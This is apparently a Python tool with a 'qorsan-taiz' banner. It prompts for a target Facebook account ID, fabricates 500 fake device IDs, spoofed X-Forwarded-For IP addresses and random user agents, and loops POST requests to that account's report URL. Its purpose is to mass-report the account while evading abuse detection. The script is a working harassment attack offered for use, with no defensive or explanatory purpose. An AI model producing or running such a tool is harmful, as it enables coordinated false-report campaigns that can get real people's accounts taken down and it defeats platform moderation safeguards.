#qorsan-taiz
import os
os.system("pip install requests")
os.system("pip install colorama")
import requests
import random
import time
#from colorama import Fore
Z =  '\033[1;31m' #red
F = '\033[2;30m' #رصاصي
B = '\033[2;36m'#سماوي
X = '\033[1;33m' #yello
C = '\033[2;34m'#بنفسجي
M = '\033[1;92m'#green
os.system('clear')
banner = Z+"""
. ^77~^.                              :J5PPPPBB555PBGGGPYY#&#BB###BBGGPGB#BBB###BBBGGP555PGGBBBBBB##
GP#BPPGJ?J!^.                        .:~7YP5PG5?YJ??JPG5?Y##&#####B#BGP5PB#BB####BBBBBGGGBBBB##BBB##
5PP5?5YJ5P5J7^                       .~7!!7?J?7?J77JJJ55JPB###&&##BBGGGBBBGBBB##BBBBBBGBBBB#######B#
BBB5!!7 ^5G5JY!^..^!!^:            ....^7?7!^^!!!?5PG5PYJPB#&##GGBBBBB#&BBBB##BBBBBBBBBBBB#BB#BBBBB#
G&&G~^^ ?55YY557~!YJJ?7~:..        ....:^?YJ~:^~~7YGBB5JGGGB#BG5PGPG#####BB#BBBBBBBBBBBBGBBBBBBGGGB#
.Y&?::~75B5JBPJ~^7J7^JJ!7J!^.      .:....!JJ7::^^!?5P5J55Y5YYJB#&#BG#&#BBBB###BBGGBB#BBBBGGGGGG55PGB
  ^^::~PP5!~P5JY5GGP!7!^7PJ!~.     .^!!:^~7?7!^^^^7JYJ?7!!77~~Y###BBBBGBGB###BBBBBBBBBBBBBGPP555YYY5
       :~7~~!::~B@#BY!5&#PPJ?!!^^:  .7??7!~^!7!!~^^7!~!~^.~7!YGGYY5GPGPPG####BBBGGPPGGGGGP55Y555J?77
                ~PGYYYB@@BG?7~!!7!~:.^7?7!!!~77~~^~~~!!^:^^!?YPYJYYYYYJ5GGB###BBGGGPPPPPPYJ??YJJ7!~^
                  :~7YPG&&BY777~~!Y!:^JJ7~^~^!?7~^^^~^:.::!7JJ?JY55YYY5YB#BB#BBGGGPP5YY55J~:::^~~~^:
                     .:!?7~?YJ7J7^?J:^JJ?7^^7JY?!~^^::...:~7JJ?J5PYYPGG5G##BBGGGPPP555J7!^:..    ...
                           .Y?!Y??YPY5PPY?!7?JJ?!~~^^:...^^^!??JJ??JJJ?JYBBBGGG55PPP5JJ7!^:..    . .
                            ^^.~77!Y55GGJ!^^7YYYY?~7^...:~!!77!?J7????7!7J5PPPPYY555YJJ77!!~^:.     
                            :7~.~!JP:.7Y?!:?PGGGGP5Y7^:.:^^~7J?7?J?7!!~!77JYJJJJ?JJ???7!!!!~:.      
                          .?PPJ?!~GJ:^.^~^:JGB#BB##P?7~..:!7?JJJJ??~!7!~^~!77?7777!!!~~!77~:.       
                          Y5J57!!!7?:^~^^::^PBBBG##PYJ~..~J?J7?YJ???!!!!!~!~^^~~^^^~~:^^^~~:.       
                      .7Y5G7GY.~7:.:.^~!7^~J5BBP#&&#5?!::77~7?Y5Y?7~:^~~~^::::::::^~!~:^:....       
                    .~Y55GPJ5?~^:...:^!?Y!~B##B#&&##GYJ:^7!~JPPYJ!::..::....... ............        
            :~!7?JJ~7?5YYJ!7?~: ...:..:!?J?JY5G##BGP557:??YY5GPY7:...................        .      
   .^77?PGJ7GBGP5GPPY??77!~^.   .:::^JJPBBGP5PPB&BY!?7~!7?PYJYY?~::.................   . ......     
~7!!PGGB##BBPYP5GP5Y!^:.:.      .:^!PBGP&####&GB&P!^7!^~5BB#GGY7^::::.........................    ..
?YYJY55GPJJ7^.:^^^:..           ..:J&B5GGGB#&5PPG57YP??GG&@@@@&5!:.............. .........    .    .
~?55J?~..                       :77B#??5PBP&&#Y.~JPBB#&GP##&@@&&B~.........     ....................
^PYP5P#!           .         . .7PB&5?##GBP@@&?JB&@@@@@&@&#&&&&&&G7^...............................:
 ^^JB#BPY5J~.       .......... :B&&&#P5PGBB&&5P@@@&@@&&&&@@&@@&&&&BP?:....::...................:::::
   :!?P#GGP5P?:.:^:............7#@&&B5Y5GGBBGP&##GB&&&&&&@&&@@&&&&#B5~::::::::::::::::::::::::::^^^^
      .5B5!YGPJ?P#5J57:.:^:...^Y&@@#G?7YPGB#G&#B5B&&&&&&@&@&@@&&&&P5Y!~^^^^^^^^:::::::^^^^^^::^^^^~~
        :^!?J??B##7?YB55B#5J?!7G@@#&BPPGPB&&#&##YP##&&&#&&@@@@&&&#5JJ7~~~~~~^^^^^^^^^^^^^^^^^^~~~~~~
           .  .~Y5YGBGP###7P#BPG#&GG7J5YYP&@@&&&BGB######&@@&@@@@#BPP7:!!!~~~~~~~~~~~~~~~^~~^^^^^^^^
           .......:^~^:!55YG#BBBBGB##5GB#&@&&&@@@&&&#&&&&&&&B&@@&&&BPY!!!!!!!!~~~~~~~~^^^~^^^^~~^^^^
           .......:::::::^~~7P&#BG#@#BPPPB&&@@@&&&#PGB&&#BBGB#@@##&&&#G?!7!~^^^^^^~^^^^~~~^^^~~~~~~~
          ........::::::^^^^Y#@@G?Y?7BGGPB&@&&&&GBPPG#@&&BGPGB#@&&&##P5G!~~~^^^^~~~~^:^^^^^^^~~~!!!!
         .........:::::::^^^J#@&#??~:7?GB?G@&GPGBB##PB&@@#GG5G5B@&&&#P?J!~~~~~~!~~^:::^^^^~~~~~~~!!!
        ...........:::::::^:J&@B&B557GG5P5B#B###&#5PB&&@@@@B5PYG&B&&@@GY!~~~^^::::::^^^~~~~~~~~~JY~^
       .............::::::::7#@P7#&##BY55&&&&&&&P5JG&@@@@@@B!7Y55Y#&@&G!~:::::::^^^^^^^^^^^^^^:?YPY~
...    ...............:::::::YBB~5@GY55B&@@@&BB#P5GP#&&@@@@@577G5YB@@&#Y:::::^^^^^:::::::::::.!55PP5
...... ....................:.~P57~!^?5GB&#&&&#B&&&BB#&#@@@@@#YJ5?P&&&&#Y^:^^:::::::::....:^..!J5Y5PP
...................................^5GBB##&@@@&#B##P5BP@@@##&PYJ.JBP&&&G?^::::.......^: :YY..???5GBP
............  ....................~Y5G#&@@&@@&&#B#BPJ55B&@#B&&PP:!G#&&&BP7....!:....75Y:7P5J!J??GBGP
............................ ...^~JP#&@@@&&@&&##BG5J!:JGB&&&&&#P^:JPB&&#J:...75J~ .?P55JJYJ5?Y77YY5G
..........^......... :^ .. .^7..??G&&&&&&@&@#GGGG!.   ~5B@&##&&BY:YG#@&GJ^..!Y55P7YPPP5YPJJG?Y?YYY5P
........:JJ........ :JY!.  755?^JB&&#&&&&&&&BGGP5      7&&B#&&&##YJ5&@@#5JYJ5GGGGBBBBB5PP5GPYPPGPY55
!!7J!~~^JGY^^J7:::..J5PPJ.75PY5JB&&&&#&&&&&&BGYJ~^^^^~^7G55@@&#B&#5JB&&&57!5BGGGGPPGBG55GBGP5PGGPPPG
5PPG5555PP5YYYYJ?YJJPPGGP5GGGGYB&@&&BG#&&&#BPPPPGGPP555YPJJB&&&#&&P^7#&B^:?5Y5YYYYY55555P55PPPPBB#BB
####BB###BBBBBBY?GB#B###BB#B#PP&&&PG#&&#BBGP##G555YJJJJJY5G&@&&&&@G7YBGYJ7777??JJYY555PGGGGGGGGGGPPG
###BBBBBBBBBGGBY5GPGGGGGGGP555B@@&B#&&##PG#B&#GJ????????75#G&&&&#BJ?G&&&GY5777???JJYYYYYYYYYYYYY5YY5
BBBBBBBGGBGGGGGGGGGGP55YYYYPGB&&&@&@@&&#B##G5BY777!!7!77?P5P&&&##BPP5&&&BP#P!7????JJJJJJJJJJJJJJJJYJ
BBBBBBBBBBGGPGPP55YYYJJYJJJB#&#&@&#####GB#BB57!77???JJJYJ?YB#&GPGPB##@&&&BB577???J?????J?JJJJJY5555P
BBBBBBBGGGPPPP555555YJJYYY5G#&&&#&&&#&#B#####BJJJJJJJJJJJ?J5G&5!?Y7?P####P777777?????7????JYJY555P5P
######BBBGGGPPPPP55YJ??YJJG###&&#&&###&&######GYJJJJJJJJ?5PBB#?^~?^:^!77??!!!777~7???7????JJYY5555PP
####BBGGGGGPPP55YJYYYJYYJJJ5G########&&&#GGGGGGYJJJJJJJ?J5PBB5^::!!!7^~!7?!^!7777?JYPPGGBB#&&##&&#BG
#BBBGGGGGPP55P55J?5555YYYY5YG############G5P555YJYJJJJJJYG&@&B?~^^7J5GYJ?GP:?55PGBGB####GGP555YYYJ77
GGPYPPPPPPP555P5YY5YYYJ5YP##BGB###########PYYYJJYYYYY5GB#&#GGPP?JGGB&#BGPPG??5GYYJ7?J?7?J?????JJJJJJ
555Y555PPP5P5Y55PGP555PPYYYJJP#######&&&&&#BBB#####&#&&&&&#PPYGB&#B#BGP5577????Y?YYJJ?J??JJJYJYJYYY5
PPYY55555YYPPPPGGBGBGGGY?J5B#&&&&&&&&PPBGPPBGPGGG5BPYBB5PGY5Y5GYB##GYYYY??~~!!!!~!JBY?YY?JYYYYYJJYYY
GPPGGPPGGGGY5BBGBB#B##BG#&@@@@@@@&&&&####B##B#B##BBGGG#BG5YPG#BB#B5YYYJ555J?J5JJJ5PYYJJJYYYYJYYYYYJY
GGGGP5GGGBBB#&&&&@@&@&&@&&#&&&&&&&&&&&&&&&&&&&&&&&PB&###BB#&&&&&#P555YP#GY55??J555Y?JJ?7?YYY5Y5YYY5Y
                                        \033[1;92m{by: qorsan-taiz}
                                        
                                        {github: https://github.com/qorsan73}
                                        
                                        {telegram: qorsantaez73}"""

print(banner)

# Enter the ID of the target Facebook account
account_id = input(X+"Enter the ID of the target Facebook account: ")

# Generate a list of fake device IDs, fake IP addresses, and fake user agents
devices = []
ips = []
user_agents = []
for i in range(500):
    device_id = ''.join(random.choices("0123456789abcdef", k=16))
    devices.append(device_id)
    ip_address = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    ips.append(ip_address)
    user_agent = f"Mozilla/5.0 (Windows NT {random.randint(5, 10)}.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.36 (KHTML, like Gecko) Chrome/{random.randint(60, 80)}.0.{random.randint(3000, 4000)}.{random.randint(100, 200)} Safari/{random.randint(500, 600)}.36"
    user_agents.append(user_agent)

# Set up the headers
headers = {
    "User-Agent": random.choice(user_agents),
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": f"https://www.facebook.com/{account_id}",
    "X-Forwarded-For": random.choice(ips)
}

# Send the report requests using the fake devices, IP addresses, and user agents
for device, ip, user_agent in zip(devices, ips, user_agents):
    data = {"device_id": device, "source": "profile", "reason": 1}
    headers["User-Agent"] = user_agent
    headers["X-Forwarded-For"] = ip
    response = requests.post(f"https://www.facebook.com/{account_id}/report", headers=headers, data=data)
    print(M+"(Report sent using device ID", device, "and IP address", ip, "with status code", response.status_code, '✅)')
    time.sleep(random.uniform(0.1, 0.5))
